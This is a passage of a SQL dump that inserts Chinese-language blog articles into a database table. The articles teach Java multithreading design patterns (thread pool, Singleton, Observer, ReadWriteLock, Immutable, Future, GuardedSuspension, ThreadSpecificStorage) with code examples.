}\n}\n```', 0, 0, 20, 0, 0, '2019-10-03 15:34:04', '2019-10-05 22:15:04', 0, 0);
INSERT INTO `article` VALUES (90, 1, '手写线程池', '2019/10/1570088454_mmexport1570087971618.jpg', '### 实现线程池\n#### 要求实现\n1. 任务队列\n2. 拒绝策略\n3. 运行线程数自动调整\n4. 等待运行关闭\n\n#### 实现线程池\n```java\npublic class SimpleThreadPool extends Thread{\n\n    private int size;\n\n    private final int queueSize;\n\n    private final static int DEFAULT_TASK_QUEUE_SIZE = 2000;\n\n    private static volatile int seq = 0;\n\n    private final static String THREAD_PREFIX = \"SIMPLE_THREAD_POOL-\";\n\n    private final static ThreadGroup GROUP = new ThreadGroup(\"Pool_Group\");\n\n    private final static LinkedList<Runnable> TASK_QUEUE = new LinkedList<Runnable>();\n\n    private final static List<WorkerTask> THREAD_QUEUE = new ArrayList<WorkerTask>();\n\n    private final DiscardPolicy discardPolicy;\n\n    public final static DiscardPolicy DEFAULT_DISCARD_POLICY = ()->{\n        throw new DiscardException(\"Discard This Task\");\n    };\n\n    private volatile boolean destroy = false;\n\n    private int min;\n\n    private int max;\n\n    private int active;\n\n    public SimpleThreadPool() {\n        this(4, 8, 12, DEFAULT_TASK_QUEUE_SIZE, DEFAULT_DISCARD_POLICY);\n    }\n\n    public SimpleThreadPool(int min, int active, int max, int queueSize, DiscardPolicy discardPolicy) {\n        this.min = min;\n        this.active = active;\n        this.max = max;\n        this.queueSize = queueSize;\n        this.discardPolicy = discardPolicy;\n        init();\n    }\n\n    private void init() {\n        for (int i = 0; i < this.min; i++) {\n            createWorkTask();\n        }\n        this.size = min;\n        this.start();\n    }\n\n    public void submit(Runnable runnable) {\n        if (destroy) {\n            throw new IllegalStateException(\"The thread pool already destroy and not allow submit task\");\n        }\n        synchronized (TASK_QUEUE) {\n            if (TASK_QUEUE.size() > queueSize) {\n                discardPolicy.discard();\n            }\n            TASK_QUEUE.addLast(runnable);\n            TASK_QUEUE.notifyAll();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!destroy) {\n            System.out.printf(\"Pool#Min:%d,Active:%d,Max:%d,Current:%d,QueueSize:%d\\n\",\n                    this.min, this.active, this.max, this.size, TASK_QUEUE.size());\n            try {\n                Thread.sleep(5_000);\n                if (TASK_QUEUE.size() > active && size < active) { // 扩容到active个\n                    for (int i = size; i < active; i++) {\n                        createWorkTask();\n                    }\n                    System.out.println(\"The pool incremented to active.\");\n                    size = active;\n                } else if(TASK_QUEUE.size() > max && size < max) {\n                    for (int i = size; i < max; i++) {\n                        createWorkTask();\n                    }\n                    System.out.println(\"The pool incremented to max.\");\n                    size = max;\n                }\n                if (TASK_QUEUE.isEmpty() && size > active) {\n                    System.out.println(\"=============Reduce============\");\n                    synchronized (THREAD_QUEUE) {\n                        if (TASK_QUEUE.isEmpty() && size > active) {\n                            int releaseSize = size - active;\n                            for (Iterator<WorkerTask> it = THREAD_QUEUE.iterator(); it.hasNext();) {\n                                if (releaseSize <= 0) {\n                                    break;\n                                }\n                                WorkerTask task = it.next();\n                                task.close();\n                                task.interrupt();\n                                it.remove();\n                                releaseSize--;\n                            }\n                            size = active;\n                        }\n                    }\n                }\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void createWorkTask() {\n        WorkerTask task = new WorkerTask(GROUP, THREAD_PREFIX + (seq++));\n        task.start();\n        THREAD_QUEUE.add(task);\n    }\n\n    public void shutdown() throws InterruptedException {\n        while (!TASK_QUEUE.isEmpty()) {\n            Thread.sleep(50);\n        }\n        synchronized (THREAD_QUEUE) {\n            int initVal = THREAD_QUEUE.size();\n            while (initVal > 0) {\n                for(WorkerTask task : THREAD_QUEUE) {\n                    if (task.getTaskState() == TaskState.BLOCKED) {\n                        task.interrupt();\n                        task.close();\n                        initVal--;\n                    } else {\n                        Thread.sleep(10);\n                    }\n                }\n            }\n        }\n        System.out.println(GROUP.activeCount());\n        this.destroy = true;\n        System.out.println(\"The thread pool disposed\");\n    }\n\n    private enum TaskState {\n        FREE,RUNNING,BLOCKED,DEAD\n    }\n\n    public static class DiscardException extends RuntimeException {\n        public DiscardException(String message) {\n            super(message);\n        }\n    }\n\n    public interface DiscardPolicy {\n        void discard() throws DiscardException;\n    }\n\n    private static class WorkerTask extends Thread {\n        private volatile TaskState taskState = TaskState.FREE;\n        public WorkerTask(ThreadGroup group, String name) {\n            super(group, name);\n        }\n        public TaskState getTaskState() {\n            return this.taskState;\n        }\n        public void run() {\n            OUTER:\n            while (this.taskState != TaskState.DEAD) {\n                Runnable runnable;\n                synchronized (TASK_QUEUE) {\n                    while (TASK_QUEUE.isEmpty()) {\n                        try {\n                            taskState = TaskState.BLOCKED;\n                            TASK_QUEUE.wait();\n                        } catch (InterruptedException e) {\n                            System.out.println(\"Closed.\");\n                            break OUTER;\n                        }\n                    }\n                    runnable = TASK_QUEUE.removeFirst();// 拿出来运行\n                }\n                if (runnable != null) {\n                    taskState = TaskState.RUNNING;\n                    runnable.run();\n                    taskState = TaskState.FREE;\n                }\n            }\n        }\n        public void close() {\n            this.taskState = TaskState.DEAD;\n        }\n    }\n\n    public int getQueueSize() {\n        return queueSize;\n    }\n    public int getSize() {\n        return size;\n    }\n    public boolean isDestroy() {\n        return this.destroy;\n    }\n\n    public int getMin() {\n        return min;\n    }\n\n    public int getActive() {\n        return active;\n    }\n\n    public int getMax() {\n        return max;\n    }\n\n}\n```\n\n#### 测试\n```java\npublic class SimpleThreadPoolTest {\n    public static void main(String[] args) throws InterruptedException {\n        SimpleThreadPool threadPool = new SimpleThreadPool();\n        IntStream.rangeClosed(0, 40).forEach(i -> {\n            threadPool.submit(()->{\n                System.out.println(\"The runnable \" + i + \"be serviced by\" + Thread.currentThread() + \"start.\");\n                try {\n                    Thread.sleep(3_000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println(\"The runnable \" + i + \"be serviced by\" + Thread.currentThread() + \"finished.\");\n            });\n        });\n        Thread.sleep(10_000);\n        threadPool.shutdown();\n    }\n}\n```', 0, 0, 19, 0, 0, '2019-10-03 15:41:09', '2019-10-03 15:46:33', 0, 0);
INSERT INTO `article` VALUES (91, 1, 'Singleton-多线程设计模式', '2019/10/1570286217_mmexport1570282106733.jpg', '### 单例设计模式\n#### 单例设计模式Singleton\n1. 单例设计模式是最基础的设计模式\n2. 它保证只有一个实例,而不是多个实例\n\n#### Java单例设计模式的五种实现\n1. 传统饿汉式\n2. 传统懒汉式\n3. 双检测锁加volatile\n4. 静态内部类\n5. 枚举\n\n### 传统饿汉式\n```java\npublic class SingletonObject1 {\n    /**\n     * can\'t lazy load\n     */\n    private static final SingletonObject1 instance = new SingletonObject1();\n    private SingletonObject1() {\n        // empty\n    }\n    public static SingletonObject1 getInstance() {\n        return instance;\n    }\n}\n```\n1. 实现起来很简单,但无法懒加载\n\n### 传统懒汉式\n```java\npublic class SingletonObject2 {\n\n    private static SingletonObject2 instance;\n\n    private SingletonObject2() {\n        // empty\n    }\n\n    // 性能差\n    public synchronized static SingletonObject2 getInstance() {\n        if (null == instance) {\n            instance = new SingletonObject2();\n        }\n        return SingletonObject2.instance;\n    }\n}\n```\n1. 实现起来较简单,需要注意的是需要保证原子性加锁避免多线程问题,但因为加锁导致性能差\n\n### 双检测锁加volatile\n```java\npublic class SingletonObject3 {\n    // volatile 必加,否则因为jvm优化产生空指针\n    private volatile static SingletonObject3 instance;\n\n    private SingletonObject3() {\n        // empty\n    }\n\n    // double check add volatile\n    public static SingletonObject3 getInstance() {\n        if (null == instance) {\n            synchronized (SingletonObject3.class) {\n                if (null == instance) {\n                    instance = new SingletonObject3();\n                }\n            }\n        }\n        return SingletonObject3.instance;\n    }\n}\n```\n1. 较传统懒汉式而言,没有把锁放在方法上,这样只有第一次创建时需要经过加锁,其他则不需要加锁,性能好\n2. 需要注意的是synchronized前后需要两次判断来防止线程问题,这也就是双检测\n3. 需要注意的是锁对象需要加volatile来保证可见性与可序性,否则实例对象可能未创建就被使用了,从而导致空指针异常\n\n#### 可见性\n1. 由于本地内存与主存的数据并不会实时同步\n2. volatile可以保证不同线程间的可见性;强制对缓存的修改操作立刻写入主存\n3. volatile依靠cpu提供的高速缓存一致性协议(cesi)或数据总线锁进行实现\n\n#### 可序性\n```java\n// 正常逻辑认为执行顺序\n1. momery = allocate() // 分配对象内存空间\n2. ctorInstantce() // 初始化对象\n3. instance = momery // 设置instance指向刚刚分配的内存\n\n// 通过JVM和CPU优化,发生了指令重排序\n1. momery = allocate() // 分配对象内存空间\n2. instance = momery // 设置instance指向刚刚分配的内存\n3. ctorInstantce() // 初始化对象\n```\n1. 处理器为提高运算速度而做出违背代码原有顺序的优化,比如JVM中的重排序\n2. volatile利用内存屏障禁止了JVM的重排序优化,防止重排序导致的问题\n\n### 静态内部类\n```java\npublic class SingletonObject4 {\n\n    private SingletonObject4() {\n        // empty\n    }\n\n    private static class InstanceHolder {\n        private final static SingletonObject4 instance = new SingletonObject4();\n    }\n\n    public static SingletonObject4 getInstance() {\n        return InstanceHolder.instance;\n    }\n}\n```\n1. 这是一种最常见的单例写法,很简便且实用,推荐\n2. 由于静态只会初始化一次,这个特性可以有效的运用在单例模式上\n\n### 枚举\n```java\npublic class SingletonObject5 {\n\n    private SingletonObject5() {\n\n    }\n\n    private enum Singleton {\n        INSTANCE;\n\n        private final SingletonObject5 instance;\n\n        Singleton() {\n            instance = new SingletonObject5();\n        }\n\n        public SingletonObject5 getInstance() {\n            return instance;\n        }\n    }\n\n    public static SingletonObject5 getInstance() {\n        return Singleton.INSTANCE.getInstance();\n    }\n\n    public static void main(String[] args) {\n        IntStream.rangeClosed(1, 100).forEach(i -> new Thread(String.valueOf(i)){\n            @Override\n            public void run() {\n                System.out.println(SingletonObject5.getInstance());\n            }\n        }.start());\n    }\n}\n```\n1. 这是一种不为常见的写法,运用了枚举实现,在书籍上很受推荐\n2. 由于枚举只会实例化一次,这个特性可以有效的运用在单例模式上', 0, 0, 23, 0, 0, '2019-10-05 22:37:06', '2019-10-06 14:34:10', 0, 0);
INSERT INTO `article` VALUES (92, 1, 'Observer-多线程设计模式', '2019/10/1570287495_mmexport1570281766963.jpg', '### 观察者设计模式\n#### 观察者设计模式Observer\n1. 这是一种非常常见且基础的设计模式\n2. 当一个通知接收到时,通知调用单体或群体的方法\n\n### 观察者模式监视多线程执行周期\n#### 图示\n![observer.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570290651_observer.png)\n#### 观察者监听接口LifeCycleListener\n```java\npublic interface LifeCycleListener {\n\n    void onEvent(ObserverRunnable.RunnableEvent event);\n}\n```\n#### 线程状态管理及执行器ObserverRunnable\n```java\npublic class ObserverRunnable implements Runnable {\n\n    protected LifeCycleListener listener;\n\n    protected String queryId;\n\n    public ObserverRunnable(LifeCycleListener listener, String queryId) {\n        this.listener = listener;\n        this.queryId = queryId;\n    }\n\n    protected void notifyChange(final RunnableEvent event) {\n        listener.onEvent(event);\n    }\n\n    public enum RunnableState {\n        RUNNING,ERROR,DONE;\n    }\n\n    public static class RunnableEvent {\n        private final RunnableState state;\n        private final Thread thread;\n        private final Throwable cause;\n        public RunnableEvent(RunnableState state, Thread thread, Throwable cause) {\n            this.state = state;\n            this.thread = thread;\n            this.cause = cause;\n        }\n        public RunnableState getState() {\n            return state;\n        }\n        public Thread getThread() {\n            return thread;\n        }\n        public Throwable getCause() {\n            return cause;\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            notifyChange(new RunnableEvent(RunnableState.RUNNING, Thread.currentThread(), null));\n            System.out.println(\"query for the id\" + queryId);\n            Thread.sleep(1_000);\n            notifyChange(new RunnableEvent(RunnableState.DONE, Thread.currentThread(), null));\n        } catch (Exception e) {\n            notifyChange(new RunnableEvent(RunnableState.DONE, Thread.currentThread(), e));\n        }\n    }\n}\n```\n#### 观察者监听实现ThreadLifeCycleObserver\n```java\npublic class ThreadLifeCycleObserver implements LifeCycleListener {\n    private final Object LOCK = new Object();\n\n    public void concurrentQuery(List<String> ids) {\n        if (ids == null || ids.isEmpty()) {\n            return;\n        }\n        ids.stream().forEach(id -> new Thread(new ObserverRunnable(this, id)).start());\n    }\n\n    @Override\n    public void onEvent(ObserverRunnable.RunnableEvent event) {\n        synchronized (LOCK) {\n            System.out.println(\"The runnable [\" + event.getThread().getName() + \"] data change and state is [\" + event.getState() +\"]\");\n            if (event.getCause() != null) {\n                System.out.println(\"The runnable [\" + event.getThread().getName() + \"] process failed.\");\n                event.getCause();\n            }\n        }\n    }\n}\n```\n#### 测试ThreadLifeCycleClient\n```java\npublic class ThreadLifeCycleClient {\n    public static void main(String[] args) {\n        new ThreadLifeCycleObserver().concurrentQuery(Arrays.asList(\"1\", \"2\"));\n    }\n}\n```', 0, 0, 20, 0, 0, '2019-10-05 22:58:25', '2019-10-06 14:34:19', 0, 0);
INSERT INTO `article` VALUES (93, 1, 'ReadWriteLock-多线程设计模式', '2019/10/1570339051_mmexport1570282436527.jpg', '### 读写锁设计模式\n#### 读写锁设计模式ReadWriteLock\n1. 这是一种多线程情况下非常高效的设计模式\n2. 传统锁由于读与读之间不需要同步但也进行同步的原因导致性能差\n3. 读写锁的设计是读与写的锁分开实现,分为读锁与写锁,读锁与读锁共同使用并不会产生同步\n\n### 实现读写锁\n#### 图示\n![readwritelock.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570341399_readwritelock.png)\n1. 读与读,不冲突\n2. 读与写,冲突\n3. 写与写,冲突\n\n#### 读写锁ReadWriteLock\n```java\npublic class ReadWriteLock {\n    private int readingReaders = 0;\n    private int waitingReaders = 0;\n    private int writingWriters = 0;\n    private int waitingWriters = 0;\n    private boolean preferWriter = true;\n    public ReadWriteLock() {\n        this(true);\n    }\n    public ReadWriteLock(boolean preferWriter) {\n        this.preferWriter = preferWriter;\n    }\n\n    public synchronized void readLock() throws InterruptedException {\n        this.waitingReaders++;\n        try {\n            while (writingWriters > 0 || (preferWriter && waitingWriters > 0)) {\n                // 存在写入操作,不能读\n                this.wait();\n            }\n            this.readingReaders++;\n        } finally {\n            this.waitingReaders--;\n        }\n    }\n\n    public synchronized void readUnlock() {\n        this.readingReaders--;\n        this.notifyAll();\n    }\n\n    public synchronized void writeLock() throws InterruptedException {\n        this.waitingWriters++;\n        try {\n            while (readingReaders > 0 || writingWriters > 0) {\n                this.wait();\n            }\n            this.writingWriters++;\n        } finally {\n            this.waitingWriters--;\n        }\n    }\n\n    public synchronized void writeUnlock() {\n        this.writingWriters--;\n        this.notifyAll();\n    }\n}\n```\n#### 共享数据\n```java\npublic class ShardData {\n    private final char[] buffer;\n\n    private final ReadWriteLock lock = new ReadWriteLock();\n\n    public ShardData(int size) {\n        this.buffer = new char[size];\n        for (int i = 0; i < buffer.length; i++) {\n            this.buffer[i] = \'*\';\n        }\n    }\n\n    public char[] read() throws InterruptedException {\n        try {\n            lock.readLock();\n            return this.doRead();\n        } finally {\n            lock.readUnlock();\n        }\n    }\n\n    public void write(char c) throws InterruptedException {\n        try {\n            lock.writeLock();\n            this.doWrite(c);\n        } finally {\n            lock.writeUnlock();\n        }\n    }\n\n    private void doWrite(char c) {\n        for (int i = 0; i < buffer.length; i++) {\n            buffer[i] = c;\n            slowly(10);\n        }\n    }\n\n    private char[] doRead() {\n        char[] newBuf = new char[buffer.length];\n        for (int i = 0; i < buffer.length; i++) {\n            newBuf[i] = buffer[i];\n        }\n        slowly(50);\n        return newBuf;\n    }\n\n    private void slowly(int ms) {\n        try {\n            Thread.sleep(ms);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n#### 读执行器\n```java\npublic class ReaderWorker extends Thread {\n\n    private final ShardData data;\n\n    public ReaderWorker(ShardData data) {\n        this.data = data;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                char[] readBuf = data.read();\n                System.out.println(Thread.currentThread().getName() + \" reads \" + String.valueOf(readBuf));\n            }\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n#### 写执行器\n```java\npublic class WriterWorker extends Thread {\n    private static final Random random = new Random(System.currentTimeMillis());\n\n    private final ShardData data;\n\n    private final String filler;\n\n    private int index = 0;\n\n    public WriterWorker(ShardData data, String filler) {\n        this.data = data;\n        this.filler = filler;\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (true) {\n                char c = this.nextChar();\n                data.write(c);\n                Thread.sleep(random.nextInt(1_000));\n            }\n        } catch (InterruptedException e){\n            e.printStackTrace();\n        }\n    }\n\n    private char nextChar() {\n        char c = filler.charAt(index);\n        index++;\n        if (index >= filler.length()) {\n            index = 0;\n        }\n        return c;\n    }\n}\n```\n#### 测试\n```java\npublic class ReadWriteLockClient {\n    public static void main(String[] args) {\n        final ShardData shardData = new ShardData(10);\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n        new ReaderWorker(shardData).start();\n\n        new WriterWorker(shardData, \"qwe\").start();\n        new WriterWorker(shardData, \"QWE\").start();\n    }\n}\n```', 0, 0, 15, 0, 0, '2019-10-06 13:17:38', '2019-10-06 18:26:01', 0, 0);
INSERT INTO `article` VALUES (94, 1, 'Immutable-多线程设计模式', '2019/10/1570342630_mmexport1570282351152.jpg', '### 不可变设计模式\n#### 不可变设计模式Immutable\n1. 变量赋值一次后只能读取，不能改变\n2. 不可变对象内的属性也是不可变的,不可变对象内的list等属性的增删改是不被允许的\n3. 不可变对象一定是线程安全的,里面的任何属性或者引用类型的属性都不能被修改\n4. 可变对象不一定是不安全的,比如stringBuffer可以被修改但全是加了synchronized\n\n### 创建一个不可变对象\n```java\nfinal public class ImmutableTest {\n    private final int age;\n    private final String name;\n    private final List<String> list; // list内容会被修改\n\n    public ImmutableTest(int age, String name) {\n        this.age = age;\n        this.name = name;\n        this.list = new ArrayList<String>();\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public List<String> getList() {\n        return Collections.unmodifiableList(list); // list不可add..remove..\n    }\n}\n```\n### String对象的不可变\n```java\npublic class StringTest {\n    public static void main(String[] args) {\n        String s = \"Hello\";\n        String s2 = s.replace(\"l\", \"k\");\n		// hacshCode不同,String对象是不可变的\n		// 使用replace并不是实际替换,而是新创建了一个String\n        System.out.println(s2.getClass() + \" \" + s2.hashCode());\n        System.out.println(s.getClass() + \" \" + s.hashCode());\n    }\n}\n```\n### 不可变对象一定是线程安全的\n```java\nfinal public class Person {\n    private final String name;\n    private final String address;\n\n    public Person(final String name, final String address) {\n        this.name = name;\n        this.address = address;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getAddress() {\n        return address;\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \", address=\'\" + address + \'\\\'\' +\n                \'}\';\n    }\n}\n```\n```java\npublic class UserPersonThread extends Thread {\n    private Person person;\n    public UserPersonThread(Person person) {\n        this.person = person;\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            System.out.println(Thread.currentThread().getName() + \" print \" + person.toString());\n        }\n    }\n}\n```\n```java\npublic class ImmutableClient {\n    public static void main(String[] args) {\n        // share data\n        Person person = new Person(\"Alex\", \"GuanSu\");\n        IntStream.range(0, 5).forEach(i -> {\n            new UserPersonThread(person).start();\n        });\n    }\n}\n```\n1. 不可变对象一定是线程安全的,因为对象以及对象的属性都不会改变\n\n\n\n### 不可变对象的性能\n```java\npublic class ImmutablePerformance {\n    public static void main(String[] args) throws InterruptedException {\n        long startTimestamp = System.currentTimeMillis();\n        // SyncObj syncObj = new SyncObj();\n        // syncObj.setName(\"Alex\");\n        ImmutableObj immutableObj = new ImmutableObj(\"Alex\");\n        Thread t1 = new Thread() {\n            @Override\n            public void run() {\n                for (long i = 0L; i < 1_000_000; i++) {\n                    System.out.println(Thread.currentThread().getName() + \": \" + immutableObj.toString());\n                }\n            }\n        };\n        t1.start();\n\n        Thread t2 = new Thread() {\n            @Override\n            public void run() {\n                for (long i = 0L; i < 1_000_000; i++) {\n                    System.out.println(Thread.currentThread().getName() + \": \" + immutableObj.toString());\n                }\n            }\n        };\n        t2.start();\n        t1.join();\n        t2.join();\n\n        long endTimestamp = System.currentTimeMillis();\n        System.out.println(\"Elapsed time \" + (endTimestamp - startTimestamp));\n    }\n}\n// 不可变对象\nfinal class ImmutableObj {\n    private final String name;\n    ImmutableObj(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"ImmutableObj{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \'}\';\n    }\n}\n// 可变对象\nclass SyncObj {\n    private String name;\n    public synchronized void setName(String name) {\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"SyncObj{\" +\n                \"name=\'\" + name + \'\\\'\' +\n                \'}\';\n    }\n}\n```\n1. 多线程下,不可变对象的性能要比可变对象更好一些', 0, 0, 14, 0, 0, '2019-10-06 14:17:18', '2019-10-06 14:34:42', 0, 0);
INSERT INTO `article` VALUES (95, 1, 'Future-多线程设计模式', '2019/10/1570343628_mmexport1570283555752.jpg', '### 未来设计模式\n#### 未来设计模式Future\n1. 调用某个方法时，这个方法可能需要请求其它系统，这个过程比较耗时，为了提高客户的体验需要方法立即返回，过一段时间再查询结果\n2. 它是非常常见的设计模式,它可以有效提高程序性能体验\n\n### 实现Future\n#### 图示\n![future.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570346400_future.png)\n1. Future           -> 代表的是未来的一个凭据\n2. FutureTask       -> 将你的调用逻辑进行了隔离\n3. FutureService    -> 桥接 Future和FutureTask\n\n#### 定义接口Future\n```java\npublic interface Future<T> {\n    T get() throws InterruptedException;\n}\n```\n#### 异步Future实现\n```java\npublic class AsyncFuture<T> implements Future<T> {\n\n    private volatile boolean done = false;\n\n    private T result;\n\n    public void done(T result) {\n        synchronized (this) {\n            this.result = result;\n            this.done = true;\n            this.notifyAll();\n        }\n    }\n\n    @Override\n    public T get() throws InterruptedException {\n        synchronized (this) {\n            while (!done) {\n                this.wait();\n            }\n        }\n        return result;\n    }\n}\n```\n#### 任务接口\n```java\npublic interface FutureTask<T> {\n    T call();\n}\n```\n#### 桥接Future和FutureTask\n```java\npublic class FutureService {\n    public <T> Future<T> submit(final FutureTask<T> task) {\n        AsyncFuture<T>  asyncFuture = new AsyncFuture<>();\n        new Thread(()->{\n            T result = task.call();\n            asyncFuture.done(result);\n        }).start();\n        return asyncFuture;\n    }\n\n	// 改造一下,接收一个回调函数 \n    public <T> Future<T> submit(final FutureTask<T> task, final Consumer<T> consumer) {\n        AsyncFuture<T> asyncFuture = new AsyncFuture<>();\n        new Thread(()->{\n            T result = task.call();\n            asyncFuture.done(result);\n            consumer.accept(result);\n        }).start();\n        return asyncFuture;\n    }\n}\n```\n#### 测试\n```java\npublic class SyncInvoker {\n    public static void main(String[] args) throws InterruptedException {\n        /*String result = get();\n        System.out.println(result);*/\n        FutureService futureService = new FutureService();\n        Future<String> future = futureService.submit(() -> {\n            try {\n                Thread.sleep(10_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            return \"FINISH\";\n        }, System.out::println);\n\n        System.out.println(\"================\");\n        System.out.println(\"do other things\");\n        System.out.println(\"================\");\n        System.out.println(future.get());\n    }\n    private static String get() throws InterruptedException {\n        Thread.sleep(10_000L);\n        return \"FINISH\";\n    }\n}\n```', 0, 0, 17, 0, 0, '2019-10-06 14:33:54', '2019-10-06 15:20:35', 0, 0);
INSERT INTO `article` VALUES (96, 1, 'GuardedSuspension-多线程设计模式', '2019/10/1570346850_mmexport1570282461626.jpg', '### 挂起设计模式\n#### 挂起设计模式GuardedSuspension\n1. 判断某个条件是否为真，如果条件成立则继续执行一步，如果条件不成立用wait()方法挂起当前线程，条件为真后由另一个线程用notify()或 着notifyAll()方法唤醒挂起的线程\n\n### 实现GuardedSuspension\n#### 图示\n![GuardedSuspension.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570348211_GuardedSuspension.png)\n1. GuardedSuspension模式非常适合在队列中使用\n2. getRequest(): 当队列不存在request时用wait挂起当前线程\n3. putRequest(Request): 将request加入到队列中,并唤醒挂起的线程\n\n#### 单个请求Request\n```java\npublic class Request {\n    private final String value;\n\n    Request(String value) {\n        this.value = value;\n    }\n\n    public String getValue() {\n        return value;\n    }\n}\n```\n#### 存放请求的队列RequestQueue,实现GuardedSuspension\n```java\npublic class RequestQueue {\n\n    private final LinkedList<Request> queue = new LinkedList<>();\n\n    public Request getRequest() {\n        synchronized (queue) {\n            while (queue.size() <= 0) {\n                try {\n                    queue.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                    return null;\n                }\n            }\n            return queue.removeFirst();\n        }\n    }\n\n    public void putRequest(Request request) {\n        synchronized (queue) {\n            queue.addLast(request);\n            queue.notifyAll();\n        }\n    }\n}\n```\n#### put队列请求的线程ClientThread\n```java\npublic class ClientThread extends Thread {\n\n    private final RequestQueue queue;\n\n    private final Random random;\n\n    private final String sendValue;\n\n    public ClientThread(RequestQueue queue, String sendValue) {\n        this.queue = queue;\n        this.sendValue = sendValue;\n        this.random = new Random(System.currentTimeMillis());\n    }\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 10; i++) {\n            System.out.println(\"Client -> request \" + sendValue);\n            queue.putRequest(new Request(sendValue));\n            try {\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n#### get队列请求的ServerThread\n```java\npublic class ServerThread extends Thread {\n\n    private final RequestQueue queue;\n\n    private final Random random;\n\n    private volatile boolean closed = false;\n\n    public ServerThread(RequestQueue queue) {\n        this.queue = queue;\n        this.random = new Random(System.currentTimeMillis());\n    }\n\n    @Override\n    public void run() {\n        while (!closed) {\n            Request request = queue.getRequest();\n            if (null == request) {\n                System.out.println(\"Received the empty request.\");\n                continue;\n            }\n            System.out.println(\"Server ->\" + request.getValue());\n            try {\n                Thread.sleep(random.nextInt(1_000));\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n                return;\n            }\n        }\n    }\n\n    public void close() {\n        this.closed = true;\n        this.interrupt();\n    }\n\n}\n```\n#### 测试\n```java\npublic class SuspensionClient {\n    public static void main(String[] args) throws InterruptedException {\n        final RequestQueue queue = new RequestQueue();\n        new ClientThread(queue, \"Alex\").start();\n        ServerThread serverThread = new ServerThread(queue);\n        serverThread.start();\n\n        Thread.sleep(10_000);\n        serverThread.close();\n    }\n}\n```', 0, 0, 18, 0, 0, '2019-10-06 15:27:41', '2019-10-06 15:51:57', 0, 0);
INSERT INTO `article` VALUES (97, 1, 'ThreadSpecificStorage-多线程设计模式', '2019/10/1570350678_mmexport1570282138370.jpg', '### 线程个别存储设计模式\n#### 线程个别存储设计模式ThreadSpecificStorage\n1. 把对象封装到一个线程里,只有这一个线程看到这个对象,那么这个对象就算不是线程安全的,也不会出现任何线程不安全的问题,因为它只能在一个线程里进行访问\n2. 运用这种模式可以在调用方法链过程中不需要传递参数,但需要保证这个调用过程始终是在一个线程当中\n3. 这是非常常见的模式且非常便于使用\n\n### 使用hashMap实现ThreadSpecificStorage模式\n#### 图示\n![ThreadSpecificStorage.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570353269_ThreadSpecificStorage.png)\n1. 简易的threadSpecificStorage模式实现\n2. 将当前线程作为Map的Key进行存储,这能保证在多线程情况下,当前线程只能获得自己的存储数据\n3. jdk中有一个ThreadLocal实现了ThreadSpecificStorage设计模式,它也是将当前线程作为存储的Key值,从而实现ThreadSpecificStorage设计模式,但相对于此图,它功能更加完善\n\n#### 使用hashMap实现简易的ThreadLocal\n```java\n/**\n * 始终已当前线程作为key值\n * @param <T>\n */\npublic class ThreadLocalSimulator<T> {\n    private final Map<Thread, T> storage = new HashMap<>();\n    public void set(T t) {\n        synchronized (this) {\n            Thread key = Thread.currentThread();\n            storage.put(key, t);\n        }\n    }\n\n    public T get() {\n        synchronized (this) {\n            Thread key = Thread.currentThread();\n            T value = storage.get(key);\n            if (null == value) {\n                return initialValue();\n            }\n            return value;\n        }\n    }\n\n    public T initialValue() {\n        return null;\n    }\n}\n```\n#### 测试\n```java\npublic class ThreadLocalSimulatorTest {\n\n    private final static ThreadLocalSimulator<String> threadLocal = new ThreadLocalSimulator<String>() {\n        @Override\n        public String initialValue() {\n            return \"No value\";\n        }\n    };\n\n    private final static Random random = new Random(System.currentTimeMillis());\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(() -> {\n            threadLocal.set(\"Thread-T1\");\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(Thread.currentThread().getName() + \" \" + threadLocal.get());\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        Thread t2 = new Thread(() -> {\n            threadLocal.set(\"Thread-T2\");\n            try {\n                Thread.sleep(random.nextInt(1_000));\n                System.out.println(Thread.currentThread().getName() + \" \" + threadLocal.get());\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(\"=========================\");\n        System.out.println(Thread.currentThread().getName() + \" \" + threadLocal.get());\n    }\n}\n```\n### ThreadSpecificStorage模式用于调用方法链\n#### 传递过程中所涉及的数据Context\n```java\npublic class Context {\n\n    private String name;\n    private String cardId;\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setCardId(String cardId) {\n        this.cardId = cardId;\n    }\n\n    public String getCardId() {\n        return cardId;\n    }\n}\n```\n#### 